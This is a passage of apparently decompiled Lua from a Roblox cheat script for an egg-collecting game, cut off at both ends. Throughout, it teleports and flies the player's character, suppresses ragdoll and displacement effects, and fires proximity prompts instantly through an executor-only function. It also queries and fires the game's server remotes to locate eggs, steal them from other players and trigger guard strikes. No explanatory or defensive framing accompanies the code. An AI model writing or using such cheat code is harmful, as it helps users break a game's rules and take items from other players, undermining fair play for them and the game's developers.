			n16 = 6
			local fn21, fn22, fn23, fn24, fn25

			do
				local v28 = nil
				local connection = nil

				fn21 = function(arg, arg2, arg3, arg4, arg5)
					local n17 = arg2 - arg.Position
					local magnitude = n17.Magnitude
					local n18 = math.max(arg4, 0.0041666666666666666)
					local vector = Vector3.zero

					if magnitude > 0.01 then
						vector = n17.Unit * math.min(arg3, magnitude / n18)
					end

					local assemblyLinearVelocity = vector + Vector3.new(0, workspace.Gravity * n18 * 0.5, 0)

					if magnitude > 2 then
						if not arg5.mark then
							arg5.mark = magnitude
							arg5.clock = 0
						end

						arg5.clock = arg5.clock + arg4

						if arg5.clock >= 0.4 then
							if arg5.mark - magnitude < arg3 * 0.1 then
								pcall(function()
									arg.CFrame = arg.CFrame + n17.Unit * math.min(magnitude, arg3 * n18)
								end)
							end

							arg5.mark = magnitude
							arg5.clock = 0
						end
					else
						arg5.mark = nil
					end

					pcall(function()
						arg.AssemblyLinearVelocity = assemblyLinearVelocity
						arg.AssemblyAngularVelocity = Vector3.zero
					end)

					return magnitude <= 0.5
				end

				fn22 = function()
					local v29 = tbl3.Root()

					if v29 then
						pcall(function()
							v29.AssemblyLinearVelocity = Vector3.zero
							v29.AssemblyAngularVelocity = Vector3.zero
						end)
					end
				end

				local connection2 = nil
				local tbl33 = {}

				fn23 = function()
					v28 = nil

					if connection then
						connection:Disconnect()
						connection = nil
					end

					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end
				end

				fn24 = function()
					local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					return num ~= nil and num > workspace:GetServerTimeNow()
				end

				local flag5 = false

				local function fn26()
					if flag5 then
						return true
					end
					return true
				end

				fn25 = function(arg, arg2)
					v28 = arg
					flag5 = arg2 == true
					local v29 = connection
					local flag6

					if connection then
						flag6 = v29
					else
						flag6 = not arg
					end

					if flag6 then
						return
					end
					tbl33 = {}

					connection = RunService.Heartbeat:Connect(function()
						if not v28 or fn26() or fn24() or tbl3.AntiGuard.Busy then
							return
						end
						local v30 = tbl3.Root()
						if not v30 then
							return
						end

						pcall(function()
							local rotation = v30.CFrame.Rotation
							v30.CFrame = CFrame.new(v28) * rotation
							v30.AssemblyLinearVelocity = Vector3.zero
							v30.AssemblyAngularVelocity = Vector3.zero
						end)
					end)

					connection2 = RunService.PreSimulation:Connect(function(deltaTime)
						if not v28 or not fn26() or fn24() or tbl3.AntiGuard.Busy then
							return
						end
						local v30 = tbl3.Root()

						if v30 then
							fn21(v30, v28, n2, deltaTime, tbl33)
						end
					end)
				end
			end

			fn4(fn23)
			local fn26

			fn26 = function()
				fn23()
				tbl3.EndFlight()
				tbl3.GodMode(false)
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end
			end

			local n17, fn27, fn28

			do
				local n18 = 1.5
				n17 = 0.6

				local function fn29(arg, arg2)
					local x = arg2.X
					return (Vector3.new(arg.X, 0, arg.Z) - Vector3.new(x, 0, arg2.Z)).Magnitude
				end

				local function fn30(arg)
					local ok, result = pcall(function()
						return arg:GetPivot().Position
					end)

					return ok and result or nil
				end

				fn27 = function(arg, arg2, arg3)
					local v28 = fn29(arg.Position, arg3)
					local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
					if not areaEggSlotsClient then
						return true
					end

					for _, child in ipairs(areaEggSlotsClient:GetChildren()) do
						if child:IsA("Model") and child.Name ~= arg2 then
							local v29 = fn30(child)
							if v29 and fn29(v29, arg.Position) + n18 < v28 then
								return false
							end
						end
					end

					return true
				end

				fn28 = function(arg, arg2, arg3)
					local n19 = arg3 or 14
					local v28 = nil
					local v29

					for _, child in ipairs(workspace:GetChildren()) do
						if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
							local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

							if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
								local v30 = fn29(child.Position, arg2)

								if v30 < n19 then
									n19 = v30
									v28 = carryAreaEgg
									v29 = child
								end
							end
						end
					end

					if not v28 or not v29 then
						return nil
					end

					if type(arg) == "string" and not fn27(v29, arg, arg2) then
						return nil
					end
					return v28, v29
				end
			end

			local fn29

			fn29 = function(arg)
				local eggState = tbl.EggState

				if type(arg) == "string" and type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
					pcall(eggState.CarryFieldEgg, arg)
				end
			end

			local fn30

			do
				local function fn31()
					local carryUid = tbl3.Steal.CarryUid
					return type(carryUid) == "string" and carryUid or nil
				end

				local function fn32(arg)
					local v28 = fn31()
					if not v28 or type(arg) ~= "string" then
						return true
					end
					return v28 == arg
				end

				local function fn33(arg)
					if type(arg) ~= "string" then
						return false
					end
					local v28 = fn20(false, true)
					if #v28 == 0 then
						return true
					end

					for _, v29 in ipairs(v28) do
						if v29.Uid == arg then
							return true
						end
					end

					return false
				end

				local function fn34(arg)
					local eggState = tbl.EggState

					if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
						pcall(eggState.DropFieldEgg, "PlayerRequest")
					end

					local n18 = 0

					while tbl3.Steal.Carrying and n18 < 1 and not fn14(arg) do
						n18 += RunService.Heartbeat:Wait()
					end
				end

				fn30 = function(arg, arg2)
					local n18 = 0

					while not tbl3.Steal.Carrying and n18 < n17 and not fn14(arg2) do
						n18 += RunService.Heartbeat:Wait()
					end

					if not tbl3.Steal.Carrying then
						str3 = "The egg never reached the hand"
						return false
					end

					if fn32(arg) then
						return true
					end
					local v28 = fn31()
					if fn33(v28) then
						str3 = "Holding another egg that still matches, delivering it"
						return true
					end
					str3 = "Wrong egg in hand, dropping it"
					fn34(arg2)
					return false
				end
			end

			local fn31

			fn31 = function(arg, arg2)
				local eggState = tbl.EggState
				local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
				if not position then
					return false
				end
				local n18 = 0
				local huge = math.huge
				local n19 = 0

				while n18 < 1.5 do
					if fn14(arg2) then
						return false
					end

					if tbl3.Steal.Carrying then
						return true
					end

					if huge >= 0.06 then
						local v28 = fn28(arg.Uid, position)

						if v28 then
							pcall(function()
								v28.HoldDuration = 0
							end)

							n19 = 0

							if typeof(fireproximityprompt) == "function" then
								pcall(fireproximityprompt, v28)
							end
						else
							n19 += 1
							if n19 >= 4 then
								return false
							end

							if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
								pcall(eggState.CarryFieldEgg, arg.Uid)
							end
						end

						huge = 0
					end

					local result = RunService.Heartbeat:Wait()
					n18 += result
					huge += result
				end

				return tbl3.Steal.Carrying == true
			end

			local fn32, fn33, n18, n19, fn34, stealHome

			do
				local v28 = fn2(function()
					return ReplicatedStorage.Shared.Modules.Ragdoll
				end)

				local function fn35()
					local character = localPlayer.Character

					if type(v28) == "table" and type(v28.IsRagdolled) == "function" then
						local ok, result = pcall(v28.IsRagdolled, character)
						if ok and result == true then
							return true
						end
					end

					local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					if num and num > workspace:GetServerTimeNow() then
						return true
					end
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						local state = humanoid:GetState()
						return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
					end
					return false
				end

				fn32 = function(arg, arg2)
					if tbl3.Steal.Carrying then
						return true
					end
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
					if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
						return false
					end
					local n20 = 0

					while n20 < 1 do
						if fn14(arg2) or tbl3.Steal.Carrying then
							return tbl3.Steal.Carrying == true
						end
						local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
						local records = ok and type(result) == "table" and result.Records or nil

						if type(records) == "table" then
							local flag5 = false

							for _, record in pairs(records) do
								local flag6 = type(record) == "table" and record.Uid == arg
								local flag7

								if flag6 then
									flag7 = record.State == "Slot" or record.State == "Dropped"
								else
									flag7 = flag6
								end

								if flag7 then
									flag5 = true
									break
								end
							end

							if not flag5 then
								return tbl3.Steal.Carrying == true
							end
						end

						n20 += task.wait(0.3)
					end

					return tbl3.Steal.Carrying == true
				end

				local function fn36(arg)
					local v29 = tbl3.Root()
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not v29 or not position then
						return math.huge
					end
					return (v29.Position - position).Magnitude
				end

				fn33 = function(arg)
					local huge = math.huge
					local v29 = nil

					for _, v30 in ipairs(arg) do
						local v31 = fn36(v30)

						if v31 < huge then
							huge = v31
							v29 = v30
						end
					end

					return v29, huge
				end

				n18 = 20
				n19 = 90
				local n20 = 6

				fn34 = function(arg, arg2, arg3, arg4, arg5, arg6)
					fn23()
					local v29 = tbl3.Root()
					if not v29 then
						return false
					end
					local character = localPlayer.Character
					local position = v29.Position
					local tbl33 = {}
					local position2 = nil
					local flag5 = nil
					local str4 = nil
					local n21 = 0

					local function fn37()
						if arg4 ~= nil then
							return true
						end
						return true
					end

					local function fn38(arg7)
						n21 += arg7
						if fn14(arg2) then
							flag5 = false
							return nil
						end

						if arg3 and not tbl3.Steal.Carrying then
							flag5 = false
							str4 = "dropped"
							return nil
						end

						if arg6 then
							local v30 = arg6()

							if v30 then
								flag5 = false
								str4 = v30
								return nil
							end
						end

						local v30 = tbl3.Root()

						if not v30 or n21 >= 25 or localPlayer.Character ~= character then
							flag5 = false
							str4 = "respawned"
							return nil
						end

						return v30
					end

					local connection = RunService.Heartbeat:Connect(function(deltaTime)
						if flag5 ~= nil or fn37() or tbl3.AntiGuard.Busy then
							return
						end
						local v30 = fn38(deltaTime)
						if not v30 then
							return
						end

						if (v30.Position - position).Magnitude > n16 then
							if arg5 then
								flag5 = false
								str4 = "displaced"
								return
							end

							position = v30.Position
						end

						local v31 = arg4
						local v32

						if arg4 then
							v32 = v31
						else
							v32 = n
						end

						local n22 = arg - position
						local n23 = v32 * deltaTime
						local flag6 = n22.Magnitude <= math.max(n23, 0.05)
						position = flag6 and arg or position + n22.Unit * n23
						local vector = Vector3.new(n22.X, 0, n22.Z)
						local cframe = vector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector.Unit) or v30.CFrame.Rotation

						pcall(function()
							v30.CFrame = CFrame.new(position) * cframe
							v30.AssemblyLinearVelocity = Vector3.zero
							v30.AssemblyAngularVelocity = Vector3.zero
						end)

						if flag6 then
							flag5 = true
						end
					end)

					local connection2 = RunService.PreSimulation:Connect(function(deltaTime)
						if flag5 ~= nil or not fn37() or tbl3.AntiGuard.Busy then
							return
						end
						local v30 = fn38(deltaTime)
						if not v30 then
							return
						end
						local v31 = arg4 or n

						if arg5 and position2 and (v30.Position - position2).Magnitude > n16 + v31 * deltaTime then
							flag5 = false
							str4 = "displaced"
							return
						end

						if fn21(v30, arg, v31, deltaTime, tbl33) then
							flag5 = true
						end

						position2 = v30.Position
						position = v30.Position
					end)

					while flag5 == nil do
						RunService.Heartbeat:Wait()
					end

					connection:Disconnect()
					connection2:Disconnect()

					if fn37() and not flag5 then
						fn22()
					end

					if flag5 then
						fn25(arg, arg4 ~= nil)
					end

					return flag5, str4
				end

				local tbl33 = {
					{
						Path = { "GearGiver_Slap", "Podium" },
						Offset = Vector3.new(-16.415, 21.072, -6.106),
					},
					{
						Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
						Offset = Vector3.new(-26.776, 1.75, 18.665),
					},
					{
						Path = {
							"__OBJECTS",
							"Machines",
							"RiftMachine",
							"Rift",
							"Meshes/VoidPortal_Cube.003",
						},
						Offset = Vector3.new(-26.776, 1.75, 18.665),
					},
				}

				stealHome = function()
					for _, v29 in ipairs(tbl33) do
						local v30 = workspace

						for _, v31 in ipairs(v29.Path) do
							v30 = v30 and v30:FindFirstChild(v31) or nil
						end

						if v30 and v30:IsA("BasePart") then
							return v30.CFrame:PointToWorldSpace(v29.Offset)
						end
					end

					return Vector3.new(528.7, 70.57, -364.11)
				end

				tbl3.StealHome = stealHome

				tbl3.InsideBase = function(arg)
					if not arg then
						arg = tbl3.Root()
						arg = arg and arg.Position
					end

					if arg == nil then
						return false
					end
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("SeparationLine")
					return arg.X < (world and world:IsA("BasePart") and world.Position.X or 552)
				end

				local function fn37(arg)
					if tbl3.AntiGuard.Busy then
						return false
					end
					local character = localPlayer.Character
					local v29 = tbl3.Root()
					if not character or not v29 then
						return false
					end
					local rotation = v29.CFrame.Rotation
					local cFrame = CFrame.new(arg) * rotation

					pcall(function()
						character:PivotTo(cFrame)
					end)

					if (v29.Position - arg).Magnitude > 3 then
						pcall(function()
							v29.CFrame = cFrame
						end)
					end

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								descendant.AssemblyLinearVelocity = Vector3.zero
								descendant.AssemblyAngularVelocity = Vector3.zero
							end)
						end
					end

					return true
				end

				local function fn38(arg)
					if tbl3.AntiGuard.Busy then
						return
					end
					local character = localPlayer.Character
					local v29 = tbl3.Root()
					if not character or not v29 or not arg then
						return
					end

					if (v29.Position - arg).Magnitude > 6 then
						fn37(arg)
						return
					end

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") and descendant ~= v29 and (descendant.Position - v29.Position).Magnitude > 12 then
							pcall(function()
								descendant.CFrame = v29.CFrame
								descendant.AssemblyLinearVelocity = Vector3.zero
							end)
						end
					end
				end

				local function fn39(arg, arg2)
					local n21 = 0

					while true do
						if not (n21 < n20) then
							return not fn14(arg)
						else
							if fn14(arg) then
								break
							end
							local character = localPlayer.Character
							local flag5 = fn35()
							local v29

							if not flag5 and character then
								for _, descendant in ipairs(character:GetDescendants()) do
									if descendant:IsA("Constraint") and string.find(descendant.Name, "RagdollConstraint", 1, true) then
										flag5 = true
										break
									end
								end

								v29 = flag5
							else
								v29 = flag5
							end

							if not v29 then
								return not fn14(arg)
							end
							fn38(arg2)
							n21 += RunService.Heartbeat:Wait()
						end
					end

					return false
				end

				local function fn40(arg)
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					world = world and world:FindFirstChild("GuardAreas")
					local areaId = world and arg and arg.AreaId and world:FindFirstChild(arg.AreaId)
					return areaId and areaId:FindFirstChild("Guard") or nil
				end

				local function fn41(arg)
					local v29 = fn40(arg)
					return v29 ~= nil and v29:GetAttribute("GuardState") == "Sleeping"
				end

				local n21 = 3

				local function fn42(arg)
					local v29 = fn40(arg)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not v29 or not position then
						return nil, nil
					end

					local ok, result = pcall(function()
						return v29:GetPivot().Position
					end)

					if not ok then
						return nil, nil
					end
					local vector = Vector3.new(position.X - result.X, 0, position.Z - result.Z)
					if vector.Magnitude < 0.1 then
						return nil, nil
					end
					local n22 = result + vector.Unit * n21
					return Vector3.new(n22.X, position.Y + 3, n22.Z), result
				end

				local function fn43(arg, arg2)
					local tbl34 = { Landed = false, Destination = arg2 }
					local antiGuard = tbl3.AntiGuard
					antiGuard.HitArms = antiGuard.HitArms + 1
					tbl3.AntiGuard.HitArmedAt = os.clock()

					tbl34.Link = localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
						if tbl34.Landed or fn14(arg) then
							return
						end
						local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
						if not num or num <= workspace:GetServerTimeNow() then
							return
						end
						local v29 = tbl3.Root()
						if not v29 then
							return
						end
						tbl34.Landed = true
						fn23()

						pcall(function()
							v29.CFrame = CFrame.new(tbl34.Destination)
							v29.AssemblyLinearVelocity = Vector3.zero
						end)
					end)

					tbl34.Stop = function()
						if tbl34.Link then
							tbl34.Link:Disconnect()
							tbl34.Link = nil
							tbl3.AntiGuard.HitArms = math.max(0, tbl3.AntiGuard.HitArms - 1)
						end
					end

					return tbl34
				end

				local function fn44(arg, arg2, arg3)
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if character then
						character.PlatformStand = false
					end

					local n22 = 0
					local v29 = nil

					while true do
						if not arg2.Landed and n22 < n18 then
							if not fn14(arg) then
								if arg3 then
									arg3(arg2)
								end

								if not tbl3.Steal.Carrying then
									local v30 = v29 or n22

									if n22 - v30 > 1 then
										break
									else
										v29 = v30
										n22 += RunService.Heartbeat:Wait()
										continue
									end
								else
									n22 += RunService.Heartbeat:Wait()
									continue
								end
							end
						end

						break
					end

					arg2.Stop()
					return arg2.Landed
				end

				local n22 = 20

				local function fn45(arg, arg2, arg3, arg4)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not position then
						return false
					end
					local n23 = 0
					local huge = math.huge

					while n23 < arg3 do
						if fn14(arg2) then
							return false
						end

						if tbl3.Steal.Carrying then
							return true
						end

						if huge >= 0.1 then
							local v29 = fn28(arg.Uid, position)

							if v29 then
								pcall(function()
									v29.HoldDuration = 0
								end)

								if typeof(fireproximityprompt) == "function" then
									pcall(fireproximityprompt, v29)
								end
							else
								fn29(arg.Uid)
							end

							huge = 0
						end

						if arg4 then
							fn38(arg4)
						end

						local result = RunService.Heartbeat:Wait()
						n23 += result
						huge += result
					end

					return tbl3.Steal.Carrying == true
				end

				local function fn46(arg, arg2, arg3, arg4)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not position then
						return false
					end
					local n23 = position + Vector3.new(0, 3, 0)
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid and character:FindFirstChildWhichIsA("Tool") then
						pcall(function()
							humanoid:UnequipTools()
						end)
					end

					if arg3 then
						fn25(n23, true)
						str3 = "Waiting to stand up"
						if not fn39(arg2, n23) then
							return false
						end
					else
						str3 = "Jumping to the egg"
						local v29 = tbl3.Root()

						if v29 and (n23 - v29.Position).Magnitude <= n19 then
							pcall(function()
								local rotation = v29.CFrame.Rotation
								v29.CFrame = CFrame.new(n23) * rotation
								v29.AssemblyLinearVelocity = Vector3.zero
								v29.AssemblyAngularVelocity = Vector3.zero
							end)
						elseif not fn34(n23, arg2, nil, n2) then
							return false
						end
					end

					if fn14(arg2) then
						return false
					end
					local flag5 = arg4 and typeof(arg4.CFrame) == "CFrame"
					local v29 = nil

					if flag5 then
						v29 = fn43(arg2, arg4.CFrame.Position + Vector3.new(0, 3, 0))
					end

					local str4 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
					local flag6 = type(arg.Uid) == "string" and string.sub(arg.Uid, 1, #str4) == str4 and string.match(arg.Uid, "_([%w ]+:Slot_%d+)$") or nil
					arg4 = arg4 and flag6
					local flag7 = false

					if arg4 then
						local eggState = tbl.EggState

						if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
							str3 = "Taking the starter egg"

							task.spawn(function()
								pcall(eggState.CarryFieldEgg, arg.Uid, flag6)
							end)

							local n24 = 0

							while not tbl3.Steal.Carrying and n24 < 0.8 do
								if fn14(arg2) then
									return false
								end
								n24 += RunService.Heartbeat:Wait()
							end

							flag7 = tbl3.Steal.Carrying == true
						end
					end

					if not flag7 then
						str3 = "Taking the egg"
						flag7 = fn31(arg, arg2)

						if not flag7 and not fn14(arg2) then
							fn34(n23, arg2, nil, n2)
							flag7 = fn31(arg, arg2)
						end
					end

					if not flag7 and not fn32(arg.Uid, arg2) then
						if v29 then
							v29.Stop()
						end

						tbl32[arg.Uid] = os.clock() + n13
						str3 = "That egg would not come free"
						return false
					end

					if v29 then
						local reGuardPatrolForestStrike = networking:FindFirstChild("RE/GuardPatrol/ForestStrike")
						local v30 = fn40(arg) or fn40({ AreaId = "Forest" })
						local humanoidRootPart = v30 and v30:FindFirstChild("HumanoidRootPart")

						if reGuardPatrolForestStrike and reGuardPatrolForestStrike:IsA("RemoteEvent") and humanoidRootPart then
							str3 = "Calling the guard strike"

							pcall(function()
								reGuardPatrolForestStrike:FireServer({ EggUid = arg.Uid, GuardCFrame = humanoidRootPart.CFrame })
							end)
						end
					end

					tbl3.Steal.LastFinishedAt = os.clock()
					return true, v29
				end

				local n23 = 3
				local n24 = 30

				local function fn47(arg, arg2, arg3)
					local v29 = nil
					local v30 = nil

					for _, child in ipairs(workspace:GetChildren()) do
						if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
							local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

							if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
								local magnitude = (child.Position - arg).Magnitude

								if magnitude < arg2 then
									arg2 = magnitude
									v29 = carryAreaEgg
									v30 = child
								end
							end
						end
					end

					if v29 and v30 and type(arg3) == "string" and not fn27(v30, arg3, arg) then
						return nil
					end
					return v29, v30
				end

				local function fn48(arg)
					local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
					local v29 = workspace:FindFirstChild(arg) or areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)
					if not v29 then
						return nil
					end

					local ok, result = pcall(function()
						return v29:GetPivot().Position
					end)

					return ok and result or nil
				end

				local function fn49(arg)
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
					if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
						return nil
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					local records = ok and type(result) == "table" and result.Records or nil
					if type(records) ~= "table" then
						return nil
					end

					for _, record in pairs(records) do
						if type(record) == "table" and record.Uid == arg and typeof(record.BottomCFrame) == "CFrame" then
							return record.BottomCFrame.Position
						end
					end

					return nil
				end

				local function fn50(arg)
					local v29 = workspace:FindFirstChild(arg)
					if not v29 then
						return false
					end

					for _, descendant in ipairs(v29:GetDescendants()) do
						if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
							local ok, result, result2 = pcall(function()
								return descendant.Part0, descendant.Part1
							end)

							if ok then
								for _, v30 in ipairs({ result, result2 }) do
									if typeof(v30) == "Instance" and not v30:IsDescendantOf(v29) then
										local model = v30:FindFirstAncestorOfClass("Model")
										if model and model ~= localPlayer.Character and Players:GetPlayerFromCharacter(model) then
											return true
										end
									end
								end
							end
						end
					end

					return false
				end

				local function fn51(arg, arg2)
					local carryUid = arg2 or tbl3.Steal.CarryUid
					if type(carryUid) ~= "string" then
						return false
					end
					fn23()
					str3 = "Following the egg"
					local n25 = nil
					local vector = Vector3.zero

					local connection = RunService.PreSimulation:Connect(function(deltaTime)
						local v29 = tbl3.Root()
						if not v29 or not n25 or tbl3.Steal.Carrying or fn14(arg) then
							return
						end

						if fn24() then
							if (v29.Position - n25).Magnitude > 2 then
								fn37(n25)
							end

							return
						end

						local n26 = math.max(deltaTime, 0.0041666666666666666)
						local n27 = vector + (n25 - v29.Position) / math.max(0.08, n26)
						local n28 = n2 + vector.Magnitude

						if n28 < n27.Magnitude then
							n27 = n27.Unit * n28
						end

						local assemblyLinearVelocity = n27 + Vector3.new(0, workspace.Gravity * n26 * 0.5, 0)

						pcall(function()
							v29.AssemblyLinearVelocity = assemblyLinearVelocity
							v29.AssemblyAngularVelocity = Vector3.zero
						end)
					end)

					local n26 = 0
					local huge = math.huge
					local v29 = nil
					local v30 = nil
					local n27 = 0
					local huge2 = math.huge
					local n28 = 0
					local flag5

					while true do
						flag5 = false

						if not (n26 < n24) then
							break
						else
							if not fn14(arg) then
								if tbl3.Steal.Carrying then
									flag5 = true
									break
								else
									local v31 = tbl3.Root()

									if v31 then
										local v32 = fn48(carryUid)
										local now, flag6, n29, flag7, v33, result

										if not v32 and huge >= 0.5 then
											v32 = fn49(carryUid)
											local n30 = 0

											if v32 then
												huge = n30

												if v32 then
													now = os.clock()
													flag6 = v29 and v30 and now > v30

													if flag6 then
														n29 = (v32 - v29) / math.max(now - v30, 0.0041666666666666666)

														if n29.Magnitude < 3000 then
															vector = vector:Lerp(n29, 0.3)
														end
													end

													n25 = v32 + Vector3.new(0, 3, 0)
													v29 = v32
													v30 = now
												end

												if n27 >= 0.4 then
													n27 = 0

													if fn50(carryUid) then
														str3 = "Another player took the egg"
														break
													else
														flag7 = n25 and (n25 - v31.Position).Magnitude <= n22 and huge2 >= 0.1

														if flag7 then
															v33 = fn47(n25 - Vector3.new(0, 3, 0), 6, carryUid)

															if v33 then
																pcall(function()
																	v33.HoldDuration = 0
																end)

																huge2 = 0
																n28 = 0

																if typeof(fireproximityprompt) == "function" then
																	pcall(fireproximityprompt, v33)
																end

																result = RunService.Heartbeat:Wait()
																n26 += result
																huge2 += result
																huge += result
																n27 += result
																continue
															else
																n28 += 1
																huge2 = 0

																if not (n28 >= 20) then
																	result = RunService.Heartbeat:Wait()
																	n26 += result
																	huge2 += result
																	huge += result
																	n27 += result
																	continue
																else
																	break
																end
															end
														else
															result = RunService.Heartbeat:Wait()
															n26 += result
															huge2 += result
															huge += result
															n27 += result
															continue
														end
													end
												else
													flag7 = n25 and (n25 - v31.Position).Magnitude <= n22 and huge2 >= 0.1

													if flag7 then
														v33 = fn47(n25 - Vector3.new(0, 3, 0), 6, carryUid)

														if v33 then
															pcall(function()
																v33.HoldDuration = 0
															end)

															huge2 = 0
															n28 = 0

															if typeof(fireproximityprompt) == "function" then
																pcall(fireproximityprompt, v33)
															end

															result = RunService.Heartbeat:Wait()
															n26 += result
															huge2 += result
															huge += result
															n27 += result
															continue
														else
															n28 += 1
															huge2 = 0

															if not (n28 >= 20) then
																result = RunService.Heartbeat:Wait()
																n26 += result
																huge2 += result
																huge += result
																n27 += result
																continue
															else
																break
															end
														end
													else
														result = RunService.Heartbeat:Wait()
														n26 += result
														huge2 += result
														huge += result
														n27 += result
														continue
													end
												end
											end
										else
											if v32 then
												now = os.clock()
												flag6 = v29 and v30 and now > v30

												if flag6 then
													n29 = (v32 - v29) / math.max(now - v30, 0.0041666666666666666)

													if n29.Magnitude < 3000 then
														vector = vector:Lerp(n29, 0.3)
													end
												end

												n25 = v32 + Vector3.new(0, 3, 0)
												v29 = v32
												v30 = now
											end

											if n27 >= 0.4 then
												n27 = 0

												if fn50(carryUid) then
													str3 = "Another player took the egg"
													break
												else
													flag7 = n25 and (n25 - v31.Position).Magnitude <= n22 and huge2 >= 0.1

													if flag7 then
														v33 = fn47(n25 - Vector3.new(0, 3, 0), 6, carryUid)

														if v33 then
															pcall(function()
																v33.HoldDuration = 0
															end)

															huge2 = 0
															n28 = 0

															if typeof(fireproximityprompt) == "function" then
																pcall(fireproximityprompt, v33)
															end

															result = RunService.Heartbeat:Wait()
															n26 += result
															huge2 += result
															huge += result
															n27 += result
															continue
														else
															n28 += 1
															huge2 = 0

															if not (n28 >= 20) then
																result = RunService.Heartbeat:Wait()
																n26 += result
																huge2 += result
																huge += result
																n27 += result
																continue
															else
																break
															end
														end
													else
														result = RunService.Heartbeat:Wait()
														n26 += result
														huge2 += result
														huge += result
														n27 += result
														continue
													end
												end
											else
												flag7 = n25 and (n25 - v31.Position).Magnitude <= n22 and huge2 >= 0.1

												if flag7 then
													v33 = fn47(n25 - Vector3.new(0, 3, 0), 6, carryUid)

													if v33 then
														pcall(function()
															v33.HoldDuration = 0
														end)

														huge2 = 0
														n28 = 0

														if typeof(fireproximityprompt) == "function" then
															pcall(fireproximityprompt, v33)
														end

														result = RunService.Heartbeat:Wait()
														n26 += result
														huge2 += result
														huge += result
														n27 += result
														continue
													else
														n28 += 1
														huge2 = 0

														if not (n28 >= 20) then
															result = RunService.Heartbeat:Wait()
															n26 += result
															huge2 += result
															huge += result
															n27 += result
															continue
														else
															break
														end
													end
												else
													result = RunService.Heartbeat:Wait()
													n26 += result
													huge2 += result
													huge += result
													n27 += result
													continue
												end
											end
										end
									end
								end
							end

							break
						end
					end

					connection:Disconnect()
					fn22()
					return flag5 or tbl3.Steal.Carrying == true
				end

				local function fn52(arg, arg2)
					local position = typeof(arg.CFrame) == "CFrame" and arg.CFrame.Position or nil
					if not position then
						return false
					end

					if tbl3.InsideBase() and not tbl3.InsideBase(position) then
						local v29 = stealHome()

						if v29 then
							str3 = "Leaving the base through the safe zone"
							if not fn34(v29 + Vector3.new(0, 3, 0), arg2, nil, n2) then
								return false
							end
						end
					end

					str3 = "Flying to the egg"
					if not fn34(position + Vector3.new(0, 3, 0), arg2, nil, n2) then
						return false
					end
					str3 = "Taking the egg"
					local v29 = fn45(arg, arg2, 0.6, nil)

					if not v29 and not fn14(arg2) then
						v29 = fn31(arg, arg2)
					end

					if not v29 and not fn32(arg.Uid, arg2) then
						tbl32[arg.Uid] = os.clock() + n13
						return false
					end
					tbl3.Steal.LastFinishedAt = os.clock()
					return true
				end

				local tbl34 = { Uid = nil, Freed = nil, Token = nil }
				local n25 = 3

				local function fn53()
					local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
					world = world and world:FindFirstChild("Areas")
					local guardAreas = world and world:FindFirstChild("GuardAreas")
					local v29 = tbl3.Root()
					if not guardAreas or not v29 then
						return nil
					end
					local str4 = tostring(localPlayer.UserId)
					local carryAreaId = tbl3.Steal.CarryAreaId and fn40({ AreaId = tostring(tbl3.Steal.CarryAreaId) }) or nil
					local huge = math.huge
					local v30 = nil

					for _, child in ipairs(guardAreas:GetChildren()) do
						local guard = child:FindFirstChild("Guard")

						if guard then
							if tostring(guard:GetAttribute("TargetPlayer")) == str4 or tostring(guard:GetAttribute("WakeTargetPlayer")) == str4 then
								return guard
							end

